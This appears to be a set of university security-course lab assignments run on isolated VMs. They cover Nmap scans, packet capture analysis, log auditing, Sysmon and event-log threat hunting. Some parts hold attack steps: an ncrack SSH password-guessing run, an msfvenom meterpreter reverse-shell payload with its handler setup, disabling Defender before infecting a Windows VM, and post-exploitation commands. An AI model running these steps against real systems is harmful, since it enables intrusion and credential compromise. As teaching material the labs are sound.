assignment_name: Network Traffic Generation: Host Discovery (Ping Scans) and Service Discovery (Port Scan)
description:
Submit  

Learning Objectives

  • Generate and capture network traffic. Specifically, generate network data in the context of host discovery (using Nmap to perform ping scans) and service discovery (using Nmap to perform a port scan)

Resources Needed

  • Kali Linux Virtual Machine
  • Ubuntu Virtual Machine

Pre-requisite

  • The following two previous assignments must be completed prior to working on the current assignment.
    • Download and Import/Create the Virtual Machines
    • Create a NAT Network and Configure the VMs with Static IP Addresses
  • Make sure the two machines can communicate with one another.

Task at Hand:

  • For this assignment, you need to capture network traffic using Wireshark and to generate network traffic using Nmap by performing several ping scans and a port scan. 

Instructions:

Housekeeping Note: when the time comes to run Wireshark, keep it running (capturing packets) through all 4 videos so we can save all the activity into a single PCAP file. Next week, we will analyze this. You can pause the capture as needed if you don't do all 4 assignments in one sitting. If something happens to disrupt the capture (VM crash or you forget to unpause) it won't be necessary to start all over, just keep moving on from that point. While using your own packet capture is preferred, I will be providing you with a PCAP file next week should something not work right with yours.

If you have not done so, please watch the first recording on this link Network Services & Traffic Generation and complete this assignment by repeating what I did and capturing and submitting the relevant screenshots. Specifically,

Perform the following steps on your Kali Linux VM

  1. Open a new terminal and type the following command to start Wireshark
    • sudo wireshark
  2. Start a new packet capture on the appropriate interface
  3. Open a new terminal and type the following command to perform an ARP ping scan of the local network to identify the hosts that are online
    • sudo nmap -sn -PR 192.168.150.1/24
  4. When the scan has completed, take a screenshot showing that at least your Ubuntu VM is online.
  5. In the same terminal, type the following command to perform an ICMP ping scan of the local network to identify the hosts that are online
    • sudo nmap -sn -PE --send-ip 192.168.150.1/24
  6. When the scan has completed, take a screenshot showing that at least your Ubuntu VM is online.
  7. In the same terminal, type the following command to perform an SYN ping scan of the local network to identify the hosts that are online
    • sudo nmap -sn -PS --send-ip 192.168.150.1/24
  8. When the scan has completed, take a screenshot showing that at least your Ubuntu VM is online.
  9. In the same terminal, type the following command to perform a port scan of the Ubuntu VM to identify open ports on the host.
    • sudo nmap -PS 192.168.150.200
  10. When the scan has completed, take a screenshot showing that at least the FTP, SSH, telnet, DNS, HTTP, and squid are running (as indicative of their corresponding ports being open). 

Submission Guidelines:

  • Please do NOT simply insert a bunch of screenshots in a Word document and expect me to know which one is which. Be specific and provide a description/short caption for each screenshot.
  • Upload [attach] your file to Canvas under this ‘Assignment’ link before the deadline.

Submit  

Learning Objectives

  • Generate and capture network traffic. Specifically, generate network data in the context of interacting with an SSH Server.

Resources Needed

  • Kali Linux Virtual Machine
  • Ubuntu Virtual Machine

Pre-requisite

  • The following two previous assignments must be completed prior to working on the current assignment.
    • Download and Import/Create the Virtual Machines
    • Create a NAT Network and Configure the VMs with Static IP Addresses
  • Make sure the two machines can communicate with one another.

Task at Hand:

  • For this assignment, you need to capture network traffic using Wireshark and to generate network traffic by interacting with the SSH server that is pre-installed/pre-configured on Ubuntu.

Instructions:

If you have not done so, please watch the second recording on this link Network Services & Traffic Generation and complete this assignment by repeating what I did and capturing and submitting the relevant screenshots. Specifically,

Perform the following steps on your Kali Linux VM

  1. Open a new terminal and ssh into the Ubuntu VM by typing the command below. When prompted, type yes and then enter the password for your Ubuntu VM (unless you changed it, the password is: dees)
    • ssh seed@192.168.150.200
  2. To view the open ports on Ubuntu, type the following command:
    • sudo netstat -ant
  3. To view the active ssh connection from the Kali Machine, type the following command
    • sudo netstat -ant | grep 22
  4. Type the following command to find what directory you are in on the Ubuntu system. In my case, the home directory of the seed user.
    • pwd
  5. Change to the Desktop by typing the following command:
    • cd ~/Desktop
  6. Type the following command to create a text file on the Ubuntu system, making sure to replace Firstname and Lastname with your actual name:
    • echo This file was created remotely by Firstname Lastname > YourLastname-ssh.txt
  7. Type the following two commands, one command per line, to list all files including hidden ones, respectively
    • ls
    • ls -a
  8. To view the content of the text file, type the following command making sure to replace YourLastname with your actual last name:
    • cat YourLastname-ssh.txt
  9. Take a screenshot (or multiple if you need to scroll to see everything) showing the actions taken above and the content of the text file and insert it into your Word Document.
  10. Type the following command to exit the ssh session.
    • exit

Submission Guidelines:

  • Please do NOT simply insert a bunch of screenshots in a Word document and expect me to know which one is which. Be specific and provide a description/short caption for each screenshot.
  • Upload [attach] your file to Canvas under this ‘Assignment’ link before the deadline.

Submit  

If you have not done so already, please watch the first recording on this page Packet Capture and Analysis - Wireshark and use the packet capture labelled network-services.pcap along with the included document (both are included below) to complete this assignment. 

Before you begin, read the following carefully:

  1. To open the packet capture in Wireshark, open a terminal, change to the directory where you have the packet capture at, and run the following command:
    • sudo wireshark network-services.pcap
  2. You should have one screenshot per question but feel free to capture more (+ any notes you may want) for your records.

Below are the assignment document and packet capture that you need to use for this assignment. 

  • Document: Packet_Analysis_Wireshark
  • The packet capture: network-services.pcap

    This assignment will only assess (grade) questions 1-5 of the document. The other assignment submissions in this series cover the other questions.

Submit  

If you have not done so, please watch the recording under Part 3 on the Packet Capture and Analysis - Tcpdump page for a detailed walkthrough of analyzing the network traffic for a detailed walkthrough of analyzing the HTTP network traffic  and complete this assignment by doing what I did and capturing and submitting the relevant screenshots.

Learning Objectives

  • Analyze network traffic using a command line based tool.

Resources Needed

  1. Virtual Machines
    • Kali Linux Virtual Machine
  2. Files 
    • The packet capture: network-services.pcap

Pre-requisites

•    Download the packet capture labeled network-services.pcap to your Kali Linux VM.

Task at Hand

  • For this assignment, you need to use tcpdump to analyze the network traffic we captured in a previous learning activity. Specifically, analyze the packet capture labeled network-services.pcap to answer Questions 6a-d.

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions)

  1. Open a new terminal and change to the Desktop
  2. If you have not done so previously, create a new directory on the Desktop and label it info4135. Otherwise, change to that directory.
  3. If you have not done so previously, create a new directory inside of the info4135 directory and label it packet-analysis. Otherwise, change to the packet-analysis directory.
  4. If you have not done so previously, download the packet capture labelled network-services.pcap to your Kali Linux VM. 
  5. Move the packet capture to the packet-analysis directory.
  6. Use the packet capture and TCPDUMP  to examine the HTTP traffic. Specifically, answer the following questions
    1. Identify the HTTP request packet(s) the internal client machine(s) sent to external Web server(s). Take a screenshot showing the filter(s) and the corresponding result from the pcap packet capture.
    2. Identify the HTTP response packet(s) internal  Web server(s) sent to internal client machine(s). Take a screenshot showing the filter(s) and the corresponding result from the pcap packet capture.
    3. Identify the user-agents the internal client machine(s) used to send the HTTP requests. Take a screenshot showing the filter(s) and the corresponding result from the pcap packet capture.
    4. Identify the Web server software type/version that is running on the internal Web Servers. Take a screenshot showing the filter(s) used and the corresponding result from the pcap packet capture.

Submit  

If you have not done so, please watch the recording on this link Basic Linux-based Systems Log Analysis and complete this assignment by doing what I did and capturing and submitting the relevant screenshots.

Learning Objectives

  • Analyze host-based logs (Linux) to audit password change and login events

Resources Needed

  • Ubuntu SEED
  • Kali Linux

Task at Hand

  • For this assignment, you need to generate a host of security related events on your Ubuntu SEED VM and to analyze the logs for evidence of these events. Specifically, 
    1. Change the password of a Linux user and then analyze the auth.log file for evidence of the password change events.
    2. Perform multiple login attempts into the Ubuntu VM (both locally and remotely, successfully and unsuccessfully) and analyze the auth.log file for evidence of this login attempts. 

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions Document)

Part 0: Optional Pre-requisite

  • Before you begin, you may take a snapshot of your Ubuntu VM. You probably want to restore this snapshot after you are done with this exercise.

Part 1: Disabling Automatic Login

Perform the following steps on the Ubuntu SEED VM

  1. Start the Ubuntu VM 
  2. In the upper-right corner, click the pull-down menu, and select System Settings
  3. In the System Settings window, double-click User Accounts
  4. In the User Accounts window, select the primary user (seed), and then click the Unlock button at the upper right-corner. When prompted for password, enter dees and then click the Authenticate button
  5. Toggle the button next to Automatic Login to OFF. This will disable automatic login and require the users to login with credentials.
  6. Click the Lock button to prevent future changes
  7. Reboot the Ubuntu SEED VM 

 

Part 2: Examining the passwd, shadow, and auth.log Files

Perform the following steps on the Ubuntu SEED VM

  1. Log into the Ubuntu VM as user seed with the password dees
  2. In a new terminal, type the following two commands to examine the passwd and shadow files. These are the files where user information, including login credentials, is stored. 
    • cat /etc/passwd | grep seed
    • sudo cat /etc/shadow | grep seed
  3. In the same terminal, type the following two commands to echo your first and last names and the date/time. Make sure to use your real names (in my case, Jeff George). 
    • echo YourFirstName YourLastName
    • date
  4. Take a screenshot of your terminal showing the output of the steps 2-3 above
  5. In the terminal, change to the log directory by typing the following command: 
    • cd /var/log
  6. In the same terminal, list the content of the directory by typing the following command: 
    • ls
  7. Display the 5 most recent events in the auth.log file (this file that contains login attempts) by typing the following command: 
    • cat auth.log | tail -n 5
  8. Take a screenshot of your terminal showing the output of the previous step.
  9. Close the terminal

 

Part 3: Auditing Password Change and Local Login Attempts into the Ubuntu VM

Perform the following steps on the Ubuntu SEED VM

  1. In a new terminal, type the following command to change the password for the user seed. When prompted for the password, enter toor (the new password) twice. Note that the password you type is not visible. 
    • sudo passwd seed
  2. In the terminal, change to the log directory by typing the following command: 
    • cd /var/log
  3. Type the following command to grep for password-change events 
    • cat auth.log | grep "password changed"
  4. Take a screenshot of your terminal showing the output of the previous step.
  5. In a new terminal, type the following command to change the password for the user seed back to dees. When prompted for the password, enter  dees twice. Note that the password you type is not visible. 
    • sudo passwd seed

 

Part 4: Logging into the Ubuntu VM Remotely (Using SSH)

Perform the following steps on the Kali Linux VM

  1. Start the Kali Linux VM and log in with your credentials
  2. Open a new terminal and ssh into the Ubuntu VM by typing the command below. When prompted, type yes and then enter the password dees 
    • ssh seed@192.168.150.200
  3. In the ssh terminal, type the following two commands to echo your first and last names and the date/time. Make sure to use your real names (in my case, Jeff George) 
    • echo YourFirstName YourLastName
    • date
  4. In the ssh terminal, type the following command to close the ssh connection 
    • logout 
  5. Take a screenshot of your terminal showing the output of steps 2-4 above. 

 

Part 5: Using Ncrack to Probe the Login Credentials on Ubuntu

Perform the following steps on the Kali Linux VM

  1. In Kali Linux, open a new terminal and change to the Desktop by typing the following command 
    • cd Desktop
  2. In the same terminal, type the following command to create a new text file labeled pwd.lst 
    • sudo mousepad pwd.lst
  3. In the newly created file, type (copy/paste) the following into the pwd.lst file, one word per line. Save the file and close it 
    • uvu1
      uvu2
      uvu3
      uvu4
      uvu5
  4. In the same terminal, type the following command to use the ncrack (a password auditing tool) along with the pwd.lst file against the ssh account on the Ubuntu VM. Make sure to replace the IP with that of your Ubuntu if needed. 
    • ncrack -v 192.168.150.200 --user seed -P pwd.lst -p ssh
  5. Take a screenshot of your terminal showing the output of step 4 above. (Note: since the wordlist we created does not have the actual password, all authentication attempts should fail, and the actual password should not be identified) 

 

Part 6: Auditing Remote Login Attempts into the Ubuntu VM

Perform the following steps on the Ubuntu SEED VM

  1. Back in your Ubuntu VM, open a new terminal and change to the log directory by typing the following command: 
    • cd /var/log
  2. Type the following command to grep for ssh login attempts with accepted passwords 
    • cat auth.log | grep ssh | grep "Accepted password" 
  3. Type the following command to grep for authentication attempts by remote hosts 
    • cat auth.log | grep "rhost" 
  4. Type the following command to grep for login attempts with invalid passwords. 
    • cat auth.log | grep "Failed password" 
  5. Type the following command to grep for the failed authentication attempts. 
    • cat auth.log | grep "authentication failures"
  6. Take a screenshot of your terminal showing the output of steps 2-5 above.

Submit  

If you have not done so, please watch the recording under Part 1 - Tcpdump Overview on Packet Capture and Analysis - Tcpdump and complete this assignment by doing what I did and capturing and submitting the relevant screenshots.

Learning Objectives

  • Analyze network traffic using a command line based tool.

Resources Needed

  1. Virtual Machines
    • Kali Linux Virtual Machine
  2. Files 
    • The packet capture: network-services.pcap

Pre-requisite

•    Download the packet capture labelled network-services.pcap to your Kali Linux VM.

Task at Hand

  • For this assignment, you need to use tcpdump to analyze the network traffic we captured in a previous learning activity. Specifically, analyze the packet capture labelled network-services.pcap to answer Questions 1-4.

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions)

Use tcpdump to analyze the packet capture and answer the Questions 1-4 

  1. Examine the packet capture and list the IP addresses on the local network involved in the communication. Take a screenshot showing the filter(s) used and as many of these packets. 
    • sudo tcpdump -ttttnn -r network-services.pcap src net 192.168.150.0/24 and dst net 192.168.150.0/24 | grep -v ARP | cut -d " " -f4,6  | cut -d " " -f1 | cut -d "." -f1-4 | sort -u
    • sudo tcpdump -ttttnn -r network-services.pcap src net 192.168.150.0/24 and dst net 192.168.150.0/24 | grep -v ARP | cut -d " " -f4,6  | cut -d " " -f2 | cut -d "." -f1-4 | cut -d ":" -f1 | sort -u
  2. Examine the packet capture and list the MAC addresses on the local network involved in the communication. Take a screenshot showing the filter(s) used and as many of these packets. 
    • sudo tcpdump -ttttnn -e -r network-services.pcap | grep 'ARP.*Request' | cut -d " " -f5 | cut -d "," -f1 | sort | uniq
    • sudo tcpdump -ttttnn -e -r network-services.pcap | grep 'ARP.*Reply' | awk -F 'is-at' '{print $2}' | cut -d "," -f1 | sort -u
  3.  Examine the DNS traffic and answer the following questions:
    1. Identify the DNS Query packets and the Web site(s) that the client machine(s) inquired about? Take a screenshot showing the filter(s) used and as many of these packets. 
      • sudo tcpdump -ttttnn -r network-services.pcap dst port 53 and udp | cut -d "?" -f2 | cut -d "(" -f1 | sort -u
    2. Identify the corresponding DNS Response packets with the IP address(es) associated with the Web site(s) the client machine (s) inquired about? Take a screenshot showing the filter(s) used and as many of these packets. 
      • sudo tcpdump -ttttnn -r network-services.pcap src port 53 and udp
    3. Identify the DNS Response packets with IP address(es) associated with the Web server for google.com. Take a screenshot showing the filter(s) used and as many of these packets. 
      • sudo tcpdump -ttttnn -r network-services.pcap src port 53 and udp | grep 'google.com'
    4. Identify the DNS Response packets with IPv4 address(es) associated with the Web server for google.com. Take a screenshot showing the filter(s) used and as many of these packets. 
      • sudo tcpdump -ttttnn -vv -r network-services.pcap src port 53 and udp | grep -v AAAA | grep 'google.com'
  4. Examine that TCP traffic and answer the following questions:
    1. Examine the packet capture and list the IP addresses of all external Web servers the client machine on 192.168.150.175 initiated communication with. Take a screenshot showing the filter(s) used and as many of these packets. 
      • sudo tcpdump -ttttnn -r network-services.pcap src host 192.168.150.175 and dst net not 192.168.150.0/24 and dst port 80 and 'tcp[tcpflags]==tcp-syn'

Submit  

If you have not done so, please watch the 3 recordings under Part 2 on the Packet Capture and Analysis - Tcpdump page for a detailed walkthrough of analyzing the network traffic for (i) ARP ping scan, (ii) ICMP ping scan, and (iii) SYN Ping Scan and Port Scan and complete this assignment by doing what I did and capturing and submitting the relevant screenshots.

Learning Objectives

  • Analyze network traffic

Resources Needed

  1. Virtual Machines
    • Kali Linux Virtual Machine
  2. Files 
    • The packet capture: network-services.pcap

Pre-requisite

•    Download the packet capture labelled network-services.pcap to your Kali Linux VM.

Task at Hand

  • For this assignment, you need to use tcpdump to analyze the network traffic we captured in a previous learning activity. Specifically, analyze the packet capture labelled network-services.pcap to answer Questions 6a-c.

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions)

  1. In Kali Linux, open a new terminal and change to the Desktop
  2. If you have not done so previously, create a new directory on the Desktop and label it info4135. Otherwise, change to that directory.
  3. If you have not done so previously, create a new directory inside of the info4135 directory and label it packet-analysis. Otherwise, change to the packet-analysis directory.
  4. If you have not done so previously, download the packet capture labeled network-services.pcap to your Kali Linux VM. 
  5. Move the packet capture to the packet-analysis directory.
  6. Use the packet capture and TCPDUMP  to answer the following questions regarding ARP, ICMP, and SYN ping scans:
    1. One host does an ARP ping scan of the local network to identify the hosts that are online. Which host performed the scan? Which hosts responded to the scan (i.e., online)? Take a screenshot showing the command(s) used and the corresponding result from the pcap packet capture.
    2. One host does an ICMP ping scan of the local network to identify the hosts that are online. Which host performed the scan? Which hosts responded to the scan (i.e., online)? Take a screenshot showing the command(s) used and the corresponding result from the pcap packet capture.
    3. One host does a SYN scan of local hosts to identify open ports. Which host performed the scan? Which hosts were scanned? Which ports were identified as being open? Take a screenshot showing the command(s) used and the corresponding result from the pcap packet capture.

assignment_name: Auditing Process Creation, Command Line Execution, and Task Scheduling Events
description:
Submit  

If you have not done so, watch the recording on this link Auditing Process Creation, Command Line Execution, and Task Scheduling Events and complete this assignment by doing what I did and capturing and submitting the relevant screenshots.

Learning Objectives

  1. Enable the tracking (logging) of process creation/termination events
  2. Enable the logging of command line execution in the context of process creation
  3. Enable the logging of task scheduling events
  4. Analyze the logs in Event Viewer to identify specific events

Resources Needed

  • Windows 10 VM

Task at Hand

  • For this assignment, you need to generate a host of security related events on your Windows 10 VM and to use Event Viewer to analyze the security logs for evidence of these events. Specifically, analyze the security logs to achieve the following:
    • Analyze process creation/termination events
    • Analyze the execution of commands
    • Analyze the scheduling of tasks

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions Document)

Before you begin, the following are high-level steps of what you need to perform. It is imperative that you watch the accompanying recording for a detailed demo with step-by-step walkthrough

Part 1: Turn on Detailed Tracking to Audit Process Creation & Process Termination

  1. Open PowerShell as an administrator
  2. Type the following command to open the Local Group Policy Editor 
    • gpedit
  3. In the Local Group Policy Editor, expand Windows Settings, Security settings, Advanced Audit Policy Configuration, System Audit Policies – Local Group Policy, and Detailed Tracking
  4. Configure the Audit Process Creation to track Success and Failure Events
  5. Configure the Audit Process Termination to track Success and Failure Events
  6. Take a screenshot showing that you enabled Auditing for both Process Creation/Termination (see the recording for an example)

Part 2: Open Notepad 3 Times as follows:

  1. Open Notepad from the Start Menu
  2. Open Notepad using the command prompt. To do this, open a command prompt as an administrator and type the following command: 
    • notepad.exe
  3. Schedule a task to open Notepad upon login events by the IEUser. To do this, open the command prompt as an administrator, and type the following command (you may also copy/paste it into your command prompt window): 
    • schtasks.exe /Create /RU IEUser /SC onlogon /TN OpenNotepad /TR "cmd.exe /c notepad.exe"

Part 3: Sign-out/Sign-in to Trigger the Scheduled Task to Open Notepad

  • Note: If the task was scheduled properly, Notepad should open up automatically upon login

Part 4: Analyze the Logs for Process Creation Events Related to Opening Notepad

  1. Open PowerShell as an administrator
  2. Type the following command to start Event Viewer 
    • eventvwr
  3. Identify the process creation event related to opening notepad from the start menu (i.e., this is when you clicked on Notepad)
  4. Take a screenshot of the process creation event related to opening Notepad from the start menu (see the recording for an example)

Part 5: Enable the Logging of Task Scheduling Events

  1. Open a command prompt as an administrator
  2. Type the following command to enable the logging of task scheduling events 
    • wevtutil set-log Microsoft-Windows-TaskScheduler/Operational /enabled:true
  3. Take a screenshot from within the command prompt showing that you have successfully enabled the logging of task scheduling (see the recording for an example)

Part 6: Include Command Line in Process Creation Events

  1. Open a PowerShell window as an administrator
  2. Type the following command to open the Local Group Policy Editor 
    • gpedit
  3. Set the Enable the Include Command Line in Process Creation Events to Enabled (see the recording)

Part 7: Schedule a Task to Open the Calculator Upon Login

  1. Open the command prompt as an administrator
  2. Type the following command to schedule a task to start the calculator upon login 
    • schtasks.exe /Create /RU IEUser /SC onlogon /TN OpenCalc /TR "cmd.exe /c calc.exe"

Part 8: Sign out/Sign in to Trigger the Scheduled Tasks to Open Notepad and the Calculator

  • Note: If the tasks were scheduled properly, both Notepad and the Calculator should open up automatically upon login.

Part 9: Analyze the Logs for Process Creation Events Related to Opening the Calculator

  1. Open PowerShell as an administrator
  2. Type the following command to start Event Viewer 
    • eventvwr
  3. Identify the process creation event related to scheduling a task to open the calculator upon login 
  4. Take a screenshot of the process creation event related to scheduling a task to open the calculator upon login. This is the process in which schtasks.exe was executed to schedule the OpenCalc task. (see the recording for an example)

Part 10: Analyze the Logs for Task Scheduler Events Related to Opening the Calculator

  1. Open a PowerShell window as an administrator
  2. Type the following command to start Event Viewer 
    • eventvwr
  3. Identify the event in which the task OpenCalc was scheduled (event ID 106)
  4. Take a screenshot of the Task registered event in which the IEUser registered the Task Scheduler task OpenCal (see the recording for an example)

Part 11: Delete the Scheduled Tasks

  • See the recording on how to delete the scheduled tasks. If you skip this part, both Notepad and the Calculator will open up automatically each time you log into the VM.

Part 12: Get some Help from ChatGPT

  • See the recording for the explanation. Have a short conversation with ChatGPT to generate a script (PowerShell or Command Line) of editing some type of logging setting within windows. Don't over think this - just think of any example that would be important to log and see if you can enable/disable it using AI to help you. (Feel free to be as creative as you'd like, but this shouldn't take you more than 10 minutes)
  • Deliverable: Take a screenshot of your final prompt with a portion of the script that ChatGPT came up with (what I really want to see is your prompt so I know you're understanding the concept of this exercise).

Submit  

If you have not done so, watch the recording on this link Threat-Hunting with Event Viewer and complete this assignment by capturing and submitting the relevant screenshots.

Learning Objectives

  • Use Event Viewer to to analyze security logs for evidence related to exploitation (malware infection, persistence, credential dumping)

Resources Needed

  • Windows 10 VM
  • The security log file labelled Security-Events-Exploitation_Threat-Hunting-1.evtx

Task at Hand

  • This assignment is similar to a previous assignment for which you have a key. However, instead of finding process creation events related to Notepad or the calculator as per the previous assignment, the process creation events for this assignment are related to exploitation (malware infection, persistence, and credential dumping) by executing malicious programs (putty32x.exe, nc.exe, and mimikatz.exe).

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions Document)

  1. If you have not done so, watch the recording that accompanies this assignment. 
  2. Download this Log File to your Windows 10 VM (you may download the log file to your host system and then move it to your VM)
  3. Load the log file into Event Viewer on your Windows 10 VM
  4. Analyze the events per the log file to identify the major events (A-C below) and other information regarding each event.
    1. Initial infection. Specifically,
      1. Take a screenshot of the process creation event by which the victim executed the malicious executable putty32x.exe and thus giving the attacker an initial access to the Windows 10 system.
      2. Take a screenshot showing the start time of the putty32x.exe process. You may highlight the answer on the screenshot from A1 above.
      3. Take a screenshot of the image path which the putty32x.exe process started from (i.e., the location/path on the Windows 10 file system). You may highlight the answer on the screenshot from A1 above.
      4. Take a screenshot of the name and the ID of the parent process that spawned the putty32x.exe process. You may highlight the answer on the screenshot from A1 above.
    2. Persistence (surviving reboot) event. Specifically, 
      1. Take a screenshot of the process creation event that corresponds to scheduling a task to run netcat (nc) on the target system (Windows 10) upon startup.
      2. Take a screenshot showing the start time of the schtasks.exe process start? You may highlight the answer on the screenshot from B1 above.
      3. Take a screenshot showing the path from which the schtasks.exe process started. You may highlight the answer on the screenshot from B1 above.
      4. Take a screenshot of the name and process ID of the parent process that spawned the schtasks.exe process. You may highlight the answer on the screenshot from B1 above.
      5. Take a screenshot of the command that was executed to schedule the process creation? You may highlight the answer on the screenshot from B1 above.
    3. Credential dumping. Specifically,
      1. Take a screenshot of the process creation event that corresponds to executing mimikatz.exe on the target (Windows 10) system.
      2. Take a screenshot showing the start time of the mimikatz.exe process. You may highlight the answer on the screenshot from C1 above.
      3. Take a screenshot of the name and process ID of the parent process that spawned the mimikatz.exe process. You may highlight the answer on the screenshot from C1 above.

If you have not done so, please watch the first recording on this link Threat-Hunting with Sysmon and complete this assignment by doing what I did and capturing and submitting the relevant screenshot(s).

Learning Objectives

  • Install Sysmon on a Windows System (the Windows10 VM)
  • Update the Configuration file for Sysmon.
  • Log Events with Sysmon.

Resources Needed

  1. Virtual Machines
    • Windows 10 VM
  2. Files
    • Executable: Sysmon64.exe
    • Configuration file: config.xml

Download Security-Events-Exploitation_Threat-Hunting-1.evtx

Task at Hand

  • For this assignment, you need to download and install Sysmon on your Windows virtual machine and to configure it to compute MD5 hashes of files, and to log Network Connections.

Submission Guidelines

  • Upload a document with the screenshot to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions Document)

  1. Start the Windows 10 VM
  2. Download the following two files to your Windows 10 VM. Alternatively, download the files to your host system and then move them to your Windows 10 VM:
    • Executable: Sysmon64.exe
    • Configuration file: config.xml
  3. Make a copy of or move the Sysmon64.exe executable to C:\Windows\System32.
  4. Make a copy of or move the config.xml configuration file to C:\Windows.
  5. Open a PowerShell Window as an Administrator.
  6. If needed, run the following command to change to the C:\Windows\System32 directory:
    • cd C:\Windows\System32
  7. Run the following command to install Sysmon:
    • .\Sysmon64.exe -accepteula -i
  8. Run the following command to update the configuration file for Sysmon, to compute MD5 hashes of files, and to log Network Connections:
    • .\Sysmon64.exe -c C:\Windows\config.xml -h md5 -l -n
      • Notes regarding the command above:
        • -c to update the configuration file
        • -h to specify the hash algorithm
        • -l (lower case L) to load logging modules
        • -n to log network connections
  9. Take a screenshot from within the PowerShell Window showing that you have installed Sysmon and configured it to use the config.xml file.

Submit  

If you have not done so, watch the third recording on this link Threat-Hunting with Sysmon and follow along to infect the Windows 10 VM with the malicious executable msfpayload.exe that you created in the Malicious Files (Executables) Creation/Download/Extractions assignment. 

Learning Objectives

  • Perform a successful malware infection to gain initial access into a Windows 10 system.
  • Perform post-exploitation activities on the compromised system.

Resources Needed

  1. Virtual Machines
    • Kali Linux
    • Windows 10 
  2. Files
    • Malware sample: msfpayload.exe

Download Security-Events-Exploitation_Threat-Hunting-1.evtx

Task

Infect Windows 10 with the malicious executable msfpayload.exe to gain initial access and then perform post-exploitation activities on the compromised system.

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions Document)

Before you begin, the following are high-level steps of what you need to perform. Please watch the accompanying recording for a detailed demo with a step-by-step walkthrough. 

Part 0: Malware Creation 

We created malware msfpayload.exe in a previous learning activity.

Part 1: Pre-Infection Preparation

Perform the following steps on Kali Linux:

  1. In a new terminal, type the following command to start Apache Web Server
    • sudo service apache2 start
  2. In a terminal, type the following command to start the msfconsole interface:
    • msfconsole
  3. In the msfconsole terminal, type the following command to start a listener with the multi/handler module:
    • use exploit/multi/handler
  4. In the msfconsole terminal, type the following command to set the payload to windows/meterpreter/reverse_tcp:
    • set payload windows/meterpreter/reverse_tcp
  5. In the msfconsole terminal, type the following command to set the local host to the IP address of Kali Linux:
    • set lhost 192.168.150.175 
  6. In the msfconsole terminal, type the following command to set the local port to 4444:
    • set lport 4444
  7. In the msfconsole terminal, type the following command to initiate the exploit:
    • Exploit

Part 2: Infection and Initial Access

Perform the following steps on Windows 10:

  1. Turn off the Windows Defender Antivirus
  2. Download the malicious executable msfpayload.exe to Windows 10
  3. Run the malicious executable msfpayload.exe on Windows 10 to infect it with it.

Part 3: Post-Exploitation Activities

Perform the following steps on Kali Linux:

  1. In the meterpreter terminal, type the following commands, one at a time, to retrieve information about the compromised system and to perform privilege escalation:
    • sysinfo
    • getuid
    • ipconfig
    • getsytem
    • getuid
  2. Take a screenshot evidencing the initial access and subsequent post-exploitation activities. Your screenshot should look like the one below but with a different date/time stamp.
  3. Keep the meterpreter session open and proceed to Exploitation-Part2-Infect-Windows-with-realvirus.exe. If you close the meterpreter session, you will need to re-do this assignment before you can proceed to Exploitation-Part2-Infect-Windows-with-realvirus.exe.

If you have not done so, watch the second recording on this link Threat-Hunting with Sysmon and complete this assignment by doing what I did and capturing and submitting the relevant screenshots.

Learning Objectives

  • Create the malicious executable.
  • Host the malicious executable.

Resources Needed

  1. Virtual Machines
    • Kali Linux
  2. Files
    • Malware sample: realvirus.7z (The archive is password-protected and the password is: malware)

Download Security-Events-Exploitation_Threat-Hunting-1.evtx

Tasks

  1. Use msfvenom to create the malicious executable msfpaylaod.exe and then host the executable on the Apache Web Server.

  2. Download the malware sample realvirus.7z to your Kali Linux and extract it to obtain the realvirus.exe. The archive is password-protected. The password is: malware)

Submission Guidelines

  • Upload a document with the screenshots to Canvas by the deadline.

Instructions (also provided in a Word document: Instructions Document)

Part 1: Create the Malicious Executable msfpayload.exe 

  1. In a new terminal, type the command below which uses the msfvenom utility of Metasploit to generate an executable file (program) labelled msfpayload.exe.
    • sudo msfvenom --payload windows/meterpreter/reverse_tcp --format exe LHOST=192.168.150.175 LPORT=4444 > msfpayload.exe
      • Notes about the command above:
        • Uses the meterpreter/reverse_tcp payload; a command interpreter which will be injected into the memory of the exploited machine to give the attacker an enhanced terminal with extra functionality.
        • Creates an executable labelled msfpayload.exe.
        • Sets the local IP address to 192.168.150.175. This IP address is the IP address of the attacker (Kali Linux).
        • Sets the listening port to 4444 (default).
  2. In the terminal, type (copy/paste) the following command to make a copy of the malicious executable msfpayload.exe in the Apache Web Server root directory at /var/www/html/
    • sudo cp msfpayload.exe var/www/html/
  3. Take screenshot evidencing the creation of msfpayload.exe (per step 1 above) and moving it to the Web root directory of the Apache Web Server (per step 2 above). See the recording (4 minutes 08 seconds into the recording).

 Part 2: Download/Extract realvirus.7z

  1. Download the malware sample realvirus.7z to the Downloads directory.
  2. In a new terminal, type the following command to change to the Downloads directory.
    • cd Downloads
  3. In the terminal, type the following command to extract the archive realvirus.7z. When prompted for the password for the user kali, type kali. When for the password for extracting the archive realvirus.7z, type malware
    • sudo 7z x realvirus.7z
  4. Take screenshot evidencing the download/extraction of realvirus.7z to realvirus.exe. See the recording (6 minutes 53 seconds into the recording).

Learning Objectives

  • Generate and capture network traffic. Specifically, generate network data in the context of interacting with an FTP Server.

Resources Needed

  • Kali Linux Virtual Machine
  • Ubuntu Virtual Machine

Pre-requisite

  • The following two previous assignments must be completed prior to working on the current assignment.
    • Download and Import/Create the Virtual Machines
    • Create a NAT Network and Configure the VMs with Static IP Addresses
  • Make sure the two machines can communicate with one another. 

Task at Hand:

  • For this assignment, you need to capture network traffic using Wireshark and to generate network traffic by interacting with the FTP server that is pre-installed/pre-configured on Ubuntu.

Instructions:

If you have not done so, please watch the third recording on this link Network Services & Traffic Generation and complete this assignment by repeating what I did and capturing and submitting the relevant screenshots. Specifically,

Perform the following steps on your Ubuntu VM:

  1. Open your Web browser and go to the following link:
    • Catalog: Information Systems and Technology
  2.  Download the index.pdf file to your Ubuntu VM
  3. Open a new terminal and change to the Downloads directory by typing the following command:
    • cd Downloads
  4. In the same terminal, type the following command to copy the index.pdf file to the FTP root directory (/srv/ftp)
    • sudo cp -b ~/Downloads/index.pdf /srv/ftp

Perform the following steps on your Kali Linux VM:

